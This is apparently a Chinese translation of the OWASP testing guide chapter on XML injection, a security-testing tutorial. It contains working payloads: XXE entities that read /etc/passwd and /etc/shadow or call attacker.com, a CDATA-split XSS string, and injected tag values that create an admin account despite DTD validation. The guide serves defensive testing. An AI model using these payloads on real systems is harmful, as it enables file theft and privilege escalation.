# XML注入测试

## 概述

XML注入测试是指测试人员尝试向应用程序注入XML文档。若XML解析器未能对数据进行上下文验证，则测试将产生阳性结果。

本节介绍XML注入的实际案例。首先将定义基于XML的通信方式并解释其工作原理，随后阐述通过插入XML元字符的检测方法。完成初步检测后，测试人员可获取XML结构信息，进而尝试注入XML数据与标签（标签注入）。

## 测试目标

- 识别XML注入点
- 评估可实现的攻击类型及其严重等级

## 测试方法

假设某网络应用程序采用 XML 风格的通信方式实现用户注册功能，其原理是在 `xmlDb` 文件中创建并添加新的 `user` 节点。

假设 xmlDB 文件结构如下：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```

当用户填写 HTML 表单进行注册时，应用程序通过标准请求接收用户数据。为简化说明，此处假设请求方式为 `GET`。

例如以下输入值：

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com
```

将生成如下请求：

`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

应用程序随后会构建以下节点：

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

该节点将被添加至 xmlDB 中：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>
```

### 漏洞发现

检测应用程序是否存在 XML 注入漏洞的第一步是尝试插入 XML 元字符。

XML 元字符包括：

#### 单引号：`'` 

若未进行过滤处理，当注入值作为标签属性值时，该字符可能在 XML 解析过程中引发异常。

例如存在以下属性：
`<node attrib='$inputValue'/>`

若输入值为：
`inputValue = foo'`

实例化后作为属性值插入：
`<node attrib='foo''/>`

则生成的 XML 文档格式不正确。

#### 双引号：`"` 

该字符与单引号作用相同，当属性值使用双引号包裹时适用：
`<node attrib="$inputValue"/>`

若输入值为：
`$inputValue = foo"`

替换后得到：
`<node attrib="foo""/>`

生成的 XML 文档将无效。

#### 尖括号：`>` 和 `<`

在用户输入中添加开括号或闭括号，例如：
`Username = foo<`

应用程序将构建新节点：

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

但由于开括号 '<' 的存在，生成的 XML 文档将无效。

#### 注释标签：`<!--/-->` 

该字符序列会被解析为注释的开始/结束符。当在用户名参数中注入此类字符时：
`Username = foo<!--`

应用程序将构建如下节点：

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

这将导致无效的 XML 序列。

#### 与符号：`&` 

该符号在 XML 语法中用于表示实体。实体的格式为 `&符号;`，每个实体会映射到 Unicode 字符集中的特定字符。

例如：
`<tagnode>&lt;</tagnode>`

属于格式正确且有效的 XML，表示 ASCII 字符 '<'。

若 '&' 未通过 `&amp;` 进行编码转义，则可利用此特性测试 XML 注入。

实际测试中，若提供如下输入：
`Username = &foo`

将创建新节点：

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

但同样会导致文档无效：`&foo` 未以 `;` 结尾，且 `&foo;` 实体未被定义。

#### CDATA 分隔符：`<!$$CDATA$$ / ]]>` 

CDATA 区块用于转义包含可能被识别为标记字符的文本段。换言之，CDATA 区块内的字符不会被 XML 解析器解析。

例如，若需在文本节点中表示字符串 `<foo>`，可使用 CDATA 区块：

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

这样 `<foo>` 不会被解析为标记，而是作为字符数据处理。

若按以下方式创建节点：
`<username><![CDATA[<$userName]]></username>`

测试者可尝试注入 CDATA 结束符 `]]>` 以破坏 XML 文档有效性：
`userName = ]]>`

将生成：
`<username><![CDATA[]]>]]></username>`

此片段属于无效 XML 结构。

##### CDATA 标签

假设 XML 文档需被处理生成 HTML 页面，此时 CDATA 分隔符可能被直接移除而不会检查其内容。攻击者可借此注入 HTML 标签，完全绕过现有过滤机制，使恶意代码嵌入最终页面。

具体示例如下。假设某节点包含需向用户展示的文本内容：

```xml
<html>
    $HTMLCode
</html>
```

此时攻击者可提供以下输入：

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

并获取如下节点：

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

在处理过程中，CDATA 分隔符被消除后生成以下 HTML 代码：

```html
<script>
    alert('XSS')
</script>
```

最终导致应用程序存在 XSS 漏洞。

#### 外部实体

通过定义新实体可扩展有效实体集合。若实体定义为 URI，则该实体称为外部实体。除非另行配置，外部实体将强制 XML 解析器访问 URI 指定的资源（如本地或远程系统上的文件）。此行为会使应用程序面临 XML 外部实体（XXE）攻击，攻击者可利用该漏洞对本地系统实施拒绝服务攻击、越权访问本地文件、扫描远程主机或对远程系统进行拒绝服务攻击。

测试 XXE 漏洞时可使用以下输入：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" > ] >
        <foo>&xxe;</foo>
```

若 XML 解析器尝试用 /dev/random 文件内容替换实体，该测试可能导致 Web 服务器崩溃（在 UNIX 系统中）。

#### 其他有用的测试

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
        <foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
        <foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]>
        <foo>&xxe;</foo>
```

### 标签注入

完成初步检测后，测试人员将掌握XML文档的结构信息。接下来可尝试注入XML数据与标签。以下示例展示该攻击如何导致权限提升。

假设存在前述应用程序，通过注入以下数值：

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

应用程序将构建新节点并添加到XML数据库：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

生成的XML文件格式正确。值得注意的是，对于用户tony，最终生效的userid标签值为最后出现的数值（即管理员ID 0）。这意味着我们成功注入了具备管理员权限的用户账户。

但存在一个问题：最后一个用户节点中出现了重复的userid标签。通常XML文档会关联模式定义（DTD），若不符合规范将被拒绝。

假设该XML文档受以下DTD约束：

```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```

注意userid节点被定义为基数1。在此情况下，若XML文档在处理前需通过DTD验证，则前述攻击（及其他简单攻击）将失效。

不过若测试人员能控制目标节点（本例中的userid）前的某些节点值，该问题可被解决。具体可通过注入注释开始/结束序列来注释掉原节点：

```txt
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```

此时最终XML数据库变为：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

原始`userid`节点已被注释，仅保留注入的节点。文档现在符合DTD规则。

## 源代码审计

若未正确配置，以下Java API可能存在XXE漏洞：

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

需检查源代码是否禁用文档类型、外部DTD及外部参数实体使用。

- [XML外部实体(XXE)防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

此外，若POI版本低于3.10.1，Java POI办公文档读取器可能存在XXE漏洞。
可通过JAR文件名识别POI库版本，例如：

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

以下源代码关键词适用于C语言：

- libxml2: xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

## 检测工具

- [XML注入模糊测试字符串（来自wfuzz工具）](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## 参考文献

- [WSTG-INPV-07](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)
- [XML注入](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck, "XXE（XML外部实体）攻击"](https://www.securityfocus.com/archive/1/297714)
- [OWASP XXE防护速查表](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
